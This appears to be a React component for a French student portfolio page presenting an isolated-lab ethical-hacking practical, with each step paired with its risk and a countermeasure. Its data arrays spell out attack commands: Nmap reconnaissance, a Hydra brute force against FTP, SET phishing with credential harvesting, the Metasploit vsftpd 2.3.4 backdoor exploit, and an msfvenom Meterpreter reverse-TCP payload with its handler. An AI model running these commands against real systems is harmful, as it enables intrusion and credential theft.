import { useState } from 'react';
import {
  ArrowLeft, ArrowRight, Terminal, Server, MonitorSmartphone, Network,
  Search, Key, Mail, Bug, ShieldAlert, ShieldCheck,
  CheckCircle2, Download, ChevronDown, Lock, Eye, Target,
  ListChecks, Calendar, GraduationCap,
} from 'lucide-react';
import type { FicheProjet } from '@/types';

type Props = { projet: FicheProjet; onRetour: () => void };

const MACHINES = [
  { nom: 'Kali Linux', role: 'Machine attaquante', ip: '192.168.1.2', icon: Terminal, accent: true,
    detail: 'Nmap, Hydra, Social-Engineer Toolkit, Metasploit Framework, msfvenom' },
  { nom: 'Metasploitable', role: 'Cible volontairement vulnérable', ip: '192.168.1.5', icon: Server, accent: false,
    detail: 'Services obsolètes, dont vsftpd 2.3.4 (porte dérobée connue)' },
  { nom: 'Ubuntu', role: 'Cible configurée pour le TP', ip: '192.168.1.3', icon: Server, accent: false,
    detail: 'Services FTP/SSH/HTTP installés manuellement pour les tests' },
  { nom: 'Windows', role: 'Cible configurée pour le TP', ip: '192.168.1.4', icon: MonitorSmartphone, accent: false,
    detail: "Visée par l'attaque reverse TCP / Meterpreter" },
];

type Manip = {
  objectif: string; outil: string; principe: string; capture: string; montre: string;
  resultat: string; risque: string; mesure: string; image: string;
};

const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; manips: Manip[] }[] = [
  {
    id: 'nmap', label: 'Nmap', icon: Search,
    resume: "Phase de reconnaissance : identifier les machines actives, les ports ouverts et les versions des services avant toute tentative d'attaque. Bilan : cette phase révèle un service clé, vsftpd 2.3.4, qui sera exploité plus loin avec Metasploit.",
    manips: [
      {
        objectif: 'Identifier les machines actives sur le réseau du laboratoire.',
        outil: 'Nmap — nmap 192.168.1.0/24',
        principe: "Nmap envoie des paquets à chaque adresse de la plage indiquée et interprète les réponses pour détecter les hôtes actifs.",
        capture: 'Résultat du balayage du réseau 192.168.1.0/24',
        montre: 'Les quatre machines du laboratoire (Kali, Metasploitable, Ubuntu, Windows) répondent comme actives.',
        resultat: 'Cartographie complète des machines présentes sur le réseau isolé.',
        risque: "Une vue d'ensemble du réseau facilite le choix des cibles par un attaquant.",
        mesure: 'Segmentation réseau, détection des scans inhabituels (IDS/IPS).',
        image: '/img/sec-nmap-scan.jpg',
      },
      {
        objectif: "Déterminer les ports ouverts, les versions des services et le système d'exploitation d'une cible.",
        outil: "Nmap — options -sV (version des services) et -O (détection du système d'exploitation)",
        principe: "-sV interroge chaque port ouvert pour en déduire la version exacte du service ; -O s'appuie sur les particularités de la pile réseau pour estimer le système d'exploitation (à ne pas confondre avec -Pn, qui désactive seulement le test de disponibilité par ping). Un port « closed » signifie qu'une réponse a été reçue sans service à l'écoute, ce qui diffère d'un port « filtered », bloqué activement par un pare-feu.",
        capture: 'Scan détaillé (-sV) de la machine Metasploitable',
        montre: 'Des services datés : vsftpd 2.3.4 (port 21), OpenSSH 4.7p1 (port 22), Telnet (port 23).',
        resultat: 'Le service vsftpd 2.3.4, dont une porte dérobée est publiquement connue, est identifié.',
        risque: 'Une version de service exposée facilite la recherche, par un attaquant, du module correspondant.',
        mesure: 'Mettre à jour les services, désactiver Telnet, restreindre les bannières de version visibles.',
        image: '/img/sec-nmap-detail.jpg',
      },
    ],
  },
  {
    id: 'hydra', label: 'Hydra', icon: Key, resume: "Évaluation de la robustesse des identifiants de connexion par attaque de force brute. Bilan : un mot de passe faible suffit à ouvrir un accès complet, sans qu'aucune faille logicielle ne soit nécessaire.",
    manips: [
      {
        objectif: 'Disposer de dictionnaires de mots de passe à tester.',
        outil: '/usr/share/wordlists — fasttrack.txt, puis rockyou.txt',
        principe: 'rockyou.txt est fourni compressé et doit être décompressé (gunzip) avant usage.',
        capture: 'Dictionnaires disponibles sur Kali Linux',
        montre: 'Les fichiers fasttrack.txt et dictionnaire1.txt (dérivé de rockyou.txt) prêts à l\'emploi.',
        resultat: "Dictionnaires prêts pour l'attaque par force brute.",
        risque: 'Ces listes publiques contiennent des millions de mots de passe réellement utilisés.',
        mesure: "Mots de passe longs et uniques, audit régulier contre ces mêmes dictionnaires.",
        image: '/img/sec-wordlists.jpg',
      },
      {
        objectif: 'Évaluer la robustesse du mot de passe du compte msfadmin (service FTP).',
        outil: 'Hydra — hydra -l msfadmin -P dictionnaire.txt ftp://192.168.1.5',
        principe: 'Hydra teste automatiquement chaque mot de passe du dictionnaire jusqu\'à trouver une combinaison valide.',
        capture: 'Mot de passe retrouvé par Hydra',
        montre: 'Le message « 1 valid password found » pour le compte msfadmin.',
        resultat: 'Mot de passe retrouvé ; attaque reproduite avec succès sur SSH, HTTP, puis sur Ubuntu et Windows.',
        risque: 'Un mot de passe faible ou par défaut tombe rapidement, sans alerte nécessaire.',
        mesure: 'Mots de passe robustes, authentification multifacteur, limitation des tentatives (fail2ban).',
        image: '/img/sec-hydra-success.jpg',
      },
      {
        objectif: "Confirmer, par une connexion réelle, que l'identifiant retrouvé donne accès à la machine.",
        outil: 'Client SSH — ssh ubuntu@192.168.1.3',
        principe: 'Une connexion interactive démontre concrètement l\'impact au-delà du résultat affiché par Hydra.',
        capture: 'Connexion SSH vers la machine Ubuntu',
        montre: "La tentative de connexion vers 192.168.1.3 avec l'identifiant retrouvé.",
        resultat: "Accès confirmé à la machine Ubuntu via SSH.",
        risque: 'Un accès interactif complet permet toutes les actions d\'un utilisateur légitime.',
        mesure: 'Restreindre les comptes autorisés à distance, clés SSH plutôt que mots de passe.',
        image: '/img/sec-ssh-attempt.jpg',
      },
    ],
  },
  {
    id: 'set', label: 'SET', icon: Mail, resume: "Simulation d'ingénierie sociale : clonage d'une page de connexion pour sensibiliser au risque du phishing. Bilan : le maillon humain contourne entièrement la sécurité technique, d'où l'importance de la sensibilisation et de la double authentification.",
    manips: [
      {
        objectif: 'Préparer une page web imitant une page de connexion légitime.',
        outil: 'Social-Engineer Toolkit (SET), éditeur nano',
        principe: "SET clone localement la page ciblée ; le lien est modifié pour pointer vers l'attaquant (192.168.1.2).",
        capture: 'Fichier lien.html pointant vers l\'adresse de l\'attaquant',
        montre: "Le lien piégé, déguisé en lien Google, prêt à être diffusé.",
        resultat: 'Page clonée prête, hébergée localement.',
        risque: "Rien ne distingue visuellement cette page d'une page légitime.",
        mesure: "Vérifier systématiquement l'URL avant de saisir un mot de passe, activer la double authentification.",
        image: '/img/sec-set-html.jpg',
      },
      {
        objectif: "Observer le comportement de la page piégée lors d'une visite simulée.",
        outil: 'Serveur HTTP local (SET), machine Ubuntu comme cible simulée',
        principe: 'Le serveur local enregistre chaque requête reçue de la machine cible.',
        capture: "Requêtes HTTP reçues par l'attaquant",
        montre: "Les requêtes GET de la machine cible, confirmant le chargement de la page piégée.",
        resultat: 'La victime simulée charge bien la page clonée.',
        risque: 'Dès la saisie des identifiants, ils sont transmis sans protection technique.',
        mesure: 'Authentification multifacteur, sensibilisation continue des utilisateurs.',
        image: '/img/sec-set-clone.jpg',
      },
      {
        objectif: "Illustrer la page vue par la victime et l'interception côté attaquant.",
        outil: 'Navigateur (page clonée) et terminal SET (credential harvester)',
        principe: "Si la victime saisit un identifiant et un mot de passe, SET les capture et les affiche côté attaquant.",
        capture: "Page de connexion vue par la victime — identifiant et mot de passe masqués",
        montre: "La page de connexion clonée ; l'identifiant et le mot de passe réellement saisis durant le TP ont été masqués avant publication.",
        resultat: "Le principe de capture est démontré sans exposer de donnée personnelle.",
        risque: "Un identifiant et un mot de passe captés permettent l'usurpation du compte visé.",
        mesure: 'Gestionnaire de mots de passe lié au domaine exact, authentification à deux facteurs.',
        image: '/img/sec-set-login-masque.jpg',
      },
      {
        objectif: "Montrer la ligne d'interception côté attaquant.",
        outil: 'Terminal SET — credential harvester',
        principe: "L'outil affiche chaque champ de formulaire intercepté, dont l'identifiant et le mot de passe.",
        capture: "Identifiants interceptés — identifiant et mot de passe masqués",
        montre: "Les lignes « POSSIBLE USERNAME/PASSWORD FIELD FOUND », avec les valeurs masquées avant publication.",
        resultat: "Interception confirmée côté attaquant.",
        risque: 'Ces informations, une fois interceptées, sont immédiatement exploitables par l\'attaquant.',
        mesure: 'Filtrage anti-hameçonnage, authentification des expéditeurs (SPF/DKIM/DMARC).',
        image: '/img/sec-set-credentials-masque.jpg',
      },
    ],
  },
  {
    id: 'metasploit', label: 'Metasploit', icon: Bug, resume: "Recherche et exploitation d'une vulnérabilité connue, puis prise de contrôle à distance. Bilan : l'enchaînement reconnaissance → identifiants → exploitation transforme trois faiblesses modestes en une compromission totale.",
    manips: [
      {
        objectif: 'Rechercher un exploit correspondant au service vulnérable identifié.',
        outil: 'Metasploit (msfconsole) — search vsftpd',
        principe: 'La commande search retrouve les modules concernant un service ou une faille donnée.',
        capture: 'Recherche de modules vsftpd',
        montre: 'Le module exploit/unix/ftp/vsftpd_234_backdoor, correspondant à la version détectée par Nmap.',
        resultat: 'Module correspondant identifié.',
        risque: 'La porte dérobée est publiquement documentée et exploitable avec un outil prêt à l\'emploi.',
        mesure: "Mettre à jour dès qu'une vulnérabilité connue (CVE) est publiée.",
        image: '/img/sec-msf-search.jpg',
      },
      {
        objectif: "Configurer et exécuter l'exploit retenu.",
        outil: 'use exploit/unix/ftp/vsftpd_234_backdoor ; set RHOSTS 192.168.1.5 ; exploit',
        principe: "La commande exploit lance l'attaque et, en cas de succès, ouvre une session de commande distante.",
        capture: 'Session de commande ouverte',
        montre: 'Un shell de commande ouvert sur Metasploitable, sans authentification.',
        resultat: 'Accès distant obtenu sur la machine cible.',
        risque: "L'attaquant dispose d'un contrôle équivalent à un utilisateur local.",
        mesure: 'Isoler les services vulnérables, moindre privilège, surveillance (EDR/IDS).',
        image: '/img/sec-msf-session.jpg',
      },
      {
        objectif: "Générer un payload et établir une connexion reverse TCP.",
        outil: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o malware.txt, puis exploit/multi/handler',
        principe: "Le fichier généré (nommé malware.txt par l'option -o dans la commande, puis désigné malware.exe dans le rapport une fois le format exécutable précisé) initie une connexion sortante vers l'attaquant dès son exécution par la victime.",
        capture: "Session Meterpreter obtenue",
        montre: 'Une session Meterpreter ouverte automatiquement après exécution du fichier par la cible.',
        resultat: 'Contrôle complet de la machine Windows ciblée.',
        risque: 'Une connexion sortante initiée par la victime contourne de nombreux pare-feu.',
        mesure: 'Filtrage des connexions sortantes (egress filtering), surveillance comportementale.',
        image: '/img/sec-meterpreter-handler.jpg',
      },
    ],
  },
];

function Badge({ children }: { children: React.ReactNode }) {
  return (
    <span className="inline-flex items-center gap-1.5 rounded-full border border-electric-500/30 bg-electric-500/10 px-3 py-1 text-xs font-medium text-electric-300">
      {children}
    </span>
  );
}

function Section({ id, icon: Icon, title, children }: { id?: string; icon: typeof Search; title: string; children: React.ReactNode }) {
  return (
    <section id={id} className="border-t border-night-800 py-14 md:py-20">
      <div className="mx-auto max-w-5xl px-5">
        <div className="mb-8 flex items-center gap-3">
          <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-electric-500/10 text-electric-400">
            <Icon size={20} aria-hidden="true" />
          </span>
          <h2 className="text-2xl font-bold text-white md:text-3xl">{title}</h2>
        </div>
        {children}
      </div>
    </section>
  );
}

function ManipCard({ m, n }: { m: Manip; n: number }) {
  const [open, setOpen] = useState(n === 1);
  return (
    <div className="overflow-hidden rounded-xl border border-night-800 bg-night-900/40">
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        className="flex w-full items-center justify-between gap-3 px-5 py-4 text-left"
      >
        <span className="flex min-w-0 items-center gap-3">
          <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-electric-500/15 text-xs font-bold text-electric-300">{n}</span>
          <span className="break-words font-semibold text-night-100">{m.objectif}</span>
        </span>
        <ChevronDown size={18} className={`shrink-0 text-night-500 transition-transform ${open ? 'rotate-180' : ''}`} aria-hidden="true" />
      </button>
      {open && (
        <div className="border-t border-night-800 px-5 py-5">
          <div className="grid gap-5 md:grid-cols-2">
            <div className="min-w-0 space-y-4 text-sm">
              <div>
                <p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Outil utilisé</p>
                <p className="break-words rounded-md bg-night-950/60 px-2.5 py-2 font-mono text-xs leading-relaxed text-electric-200">{m.outil}</p>
              </div>
              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Principe de fonctionnement</p><p className="break-words text-night-200">{m.principe}</p></div>
              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Ce que montre la capture</p><p className="break-words text-night-200">{m.montre}</p></div>
            </div>
            <figure className="m-0 min-w-0">
              <img src={m.image} alt={m.capture} loading="lazy" className="w-full rounded-lg border border-night-800" />
              <figcaption className="mt-2 break-words text-xs text-night-500">{m.capture}</figcaption>
            </figure>
          </div>
          <div className="mt-5 grid gap-3 sm:grid-cols-3">
            <div className="min-w-0 rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
              <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-emerald-400"><CheckCircle2 size={13} aria-hidden="true" /> Résultat observé</p>
              <p className="break-words text-xs text-night-200">{m.resultat}</p>
            </div>
            <div className="min-w-0 rounded-lg border border-red-500/20 bg-red-500/5 p-3">
              <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-red-400"><ShieldAlert size={13} aria-hidden="true" /> Risque associé</p>
              <p className="break-words text-xs text-night-200">{m.risque}</p>
            </div>
            <div className="min-w-0 rounded-lg border border-electric-500/20 bg-electric-500/5 p-3">
              <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-electric-300"><ShieldCheck size={13} aria-hidden="true" /> Mesure de protection</p>
              <p className="break-words text-xs text-night-200">{m.mesure}</p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default function ProjetCybersecurite({ projet, onRetour }: Props) {
  const [tab, setTab] = useState(TOOLS[0].id);
  const active = TOOLS.find((t) => t.id === tab)!;

  return (
    <div className="min-h-screen pt-24 md:pt-28">
      <header className="border-b border-night-800 bg-gradient-to-b from-electric-950/40 to-transparent">
        <div className="mx-auto max-w-5xl px-5 pb-14 pt-4">
          <button type="button" onClick={onRetour} className="mb-8 inline-flex items-center gap-2 text-sm text-night-400 hover:text-electric-300">
            <ArrowLeft size={16} aria-hidden="true" /> Retour aux projets
          </button>

          <div className="mb-5 flex flex-wrap gap-2">
            <Badge><Calendar size={13} aria-hidden="true" /> {projet.periode}</Badge>
            <Badge><GraduationCap size={13} aria-hidden="true" /> {projet.statut}</Badge>
          </div>

          <h1 className="max-w-3xl text-3xl font-extrabold leading-tight text-white md:text-5xl">{projet.titre}</h1>
          <p className="mt-5 max-w-2xl text-base leading-relaxed text-night-300 md:text-lg">{projet.resume}</p>

          <div className="mt-6 flex flex-wrap gap-2">
            {projet.technologies.map((t) => <Badge key={t}>{t}</Badge>)}
          </div>

          {projet.cadreEthique && (
            <div className="mt-8 flex items-start gap-3 rounded-xl border border-amber-500/25 bg-amber-500/5 px-5 py-4">
              <ShieldAlert size={18} className="mt-0.5 shrink-0 text-amber-400" aria-hidden="true" />
              <p className="text-sm leading-relaxed text-amber-100/90">{projet.cadreEthique}</p>
            </div>
          )}

          <div className="mt-8 flex flex-wrap gap-3">
            {projet.rapport && (
              <a href={projet.rapport} download className="btn-primary">
                <Download size={16} aria-hidden="true" /> Consulter le rapport PDF
              </a>
            )}
            <a href="#methodologie" className="inline-flex items-center gap-2 rounded-lg border border-night-700 px-5 py-2.5 text-sm font-semibold text-night-200 hover:border-electric-500/50 hover:text-electric-300">
              Voir les manipulations <ArrowRight size={15} aria-hidden="true" />
            </a>
          </div>
        </div>
      </header>

      <Section icon={Target} title="Contexte et problématique">
        <p className="leading-relaxed text-night-300">{projet.problematique}</p>
      </Section>

      <Section icon={ListChecks} title="Objectifs du travail pratique">
        <ul className="grid gap-3 md:grid-cols-2">
          {projet.objectifs.map((o, i) => (
            <li key={i} className="flex items-start gap-2.5 rounded-lg border border-night-800 bg-night-900/30 p-4 text-sm text-night-300">
              <CheckCircle2 size={16} className="mt-0.5 shrink-0 text-electric-400" aria-hidden="true" />
              {o}
            </li>
          ))}
        </ul>
      </Section>

      <Section icon={Server} title="Environnement technique et machines du laboratoire">
        <ul className="mb-8 space-y-2">
          {projet.environnement.map((e, i) => (
            <li key={i} className="flex items-start gap-2.5 text-sm text-night-300">
              <span className="mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full bg-electric-500" /> {e}
            </li>
          ))}
        </ul>
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
          {MACHINES.map((m) => (
            <div key={m.nom} className={`rounded-xl border p-5 ${m.accent ? 'border-red-500/30 bg-red-500/5' : 'border-night-800 bg-night-900/40'}`}>
              <span className={`mb-3 flex h-10 w-10 items-center justify-center rounded-lg ${m.accent ? 'bg-red-500/15 text-red-400' : 'bg-electric-500/10 text-electric-400'}`}>
                <m.icon size={19} aria-hidden="true" />
              </span>
              <p className="font-semibold text-white">{m.nom}</p>
              <p className={`mt-0.5 text-xs font-medium ${m.accent ? 'text-red-400' : 'text-electric-400'}`}>{m.role}</p>
              <p className="mt-2 font-mono text-xs text-night-500">{m.ip}</p>
              <p className="mt-3 text-xs leading-relaxed text-night-400">{m.detail}</p>
            </div>
          ))}
        </div>
      </Section>

      {projet.schema && (
        <Section icon={Network} title="Architecture du laboratoire">
          <p className="mb-6 leading-relaxed text-night-300">{projet.schemaLegende}</p>
          <div className="grid gap-6 md:grid-cols-2">
            <figure className="m-0 min-w-0">
              <div className="overflow-hidden rounded-xl border border-night-800">
                <img src={projet.schema} alt="Schéma de la topologie du laboratoire" loading="lazy" className="w-full" />
              </div>
              <figcaption className="mt-2 break-words text-xs text-night-500">Schéma réalisé pour ce portfolio, à partir de la description du rapport.</figcaption>
            </figure>
            <figure className="m-0 min-w-0">
              <div className="overflow-hidden rounded-xl border border-night-800">
                <img src="/img/sec-topology.jpg" alt="Capture de la topologie configurée sous GNS3" loading="lazy" className="w-full" />
              </div>
              <figcaption className="mt-2 break-words text-xs text-night-500">Capture authentique de la topologie réellement configurée sous GNS3 (rapport original).</figcaption>
            </figure>
          </div>
        </Section>
      )}

      <section id="methodologie" className="border-t border-night-800 py-14 md:py-20">
        <div className="mx-auto max-w-5xl px-5">
          <div className="mb-8 flex items-center gap-3">
            <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-electric-500/10 text-electric-400"><Terminal size={20} aria-hidden="true" /></span>
            <h2 className="text-2xl font-bold text-white md:text-3xl">Manipulations réalisées</h2>
          </div>

          <div className="mb-8 flex flex-wrap gap-2 border-b border-night-800 pb-4">
            {TOOLS.map((t) => (
              <button
                key={t.id}
                type="button"
                onClick={() => setTab(t.id)}
                className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-semibold transition-colors ${tab === t.id ? 'bg-electric-500 text-white' : 'bg-night-900 text-night-400 hover:text-night-100'}`}
              >
                <t.icon size={15} aria-hidden="true" /> {t.label}
              </button>
            ))}
          </div>

          <p className="mb-6 max-w-2xl leading-relaxed text-night-300">{active.resume}</p>

          <div className="space-y-4">
            {active.manips.map((m, i) => <ManipCard key={i} m={m} n={i + 1} />)}
          </div>
        </div>
      </section>

      <Section icon={Eye} title="Résultats et observations">
        <ul className="space-y-3">
          {projet.resultats.map((r, i) => (
            <li key={i} className="flex items-start gap-2.5 rounded-lg border border-night-800 bg-night-900/30 p-4 text-sm text-night-300">
              <CheckCircle2 size={16} className="mt-0.5 shrink-0 text-emerald-400" aria-hidden="true" /> {r}
            </li>
          ))}
        </ul>
      </Section>

      {projet.vulnerabilites && (
        <Section icon={ShieldCheck} title="Vulnérabilités identifiées et recommandations de sécurité">
          <div className="overflow-x-auto rounded-xl border border-night-800">
            <table className="w-full min-w-[520px] border-collapse text-left text-sm">
              <thead>
                <tr className="bg-night-900 text-xs uppercase tracking-wide text-night-400">
                  <th className="px-4 py-3 font-semibold">Vulnérabilité exploitée</th>
                  <th className="px-4 py-3 font-semibold">Mesure de protection</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-night-800">
                {projet.vulnerabilites.map((v, i) => (
                  <tr key={i} className="align-top odd:bg-night-900/20">
                    <td className="break-words px-4 py-3 text-night-200">{v.vulnerabilite}</td>
                    <td className="break-words px-4 py-3 text-night-300">{v.mesure}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </Section>
      )}

      <Section icon={GraduationCap} title="Compétences techniques mobilisées">
        <div className="flex flex-wrap gap-2.5">
          {projet.competences.map((c, i) => (
            <span key={i} className="rounded-lg border border-night-800 bg-night-900/40 px-4 py-2.5 text-sm text-night-200">{c}</span>
          ))}
        </div>
      </Section>

      <Section icon={Lock} title="Conclusion">
        <div className="rounded-xl border border-night-800 bg-night-900/30 p-6">
          <p className="leading-relaxed text-night-300">
            Ce travail a montré qu'une compromission réussit rarement grâce à une seule faille : elle enchaîne des faiblesses
            techniques (services obsolètes, mots de passe faibles) et humaines (ingénierie sociale). Connaître ces techniques
            est indispensable pour bien défendre un système — c'est le principe même de l'ethical hacking qui fonde cette démarche.
          </p>
          {projet.rapport && (
            <a href={projet.rapport} download className="btn-primary mt-6 inline-flex">
              <Download size={16} aria-hidden="true" /> Télécharger le dossier technique complet (PDF)
            </a>
          )}
        </div>
      </Section>

      <div className="border-t border-night-800 py-10 text-center">
        <button type="button" onClick={onRetour} className="inline-flex items-center gap-2 text-sm text-night-400 hover:text-electric-300">
          <ArrowLeft size={16} aria-hidden="true" /> Retour à tous les projets
        </button>
      </div>
    </div>
  );
}
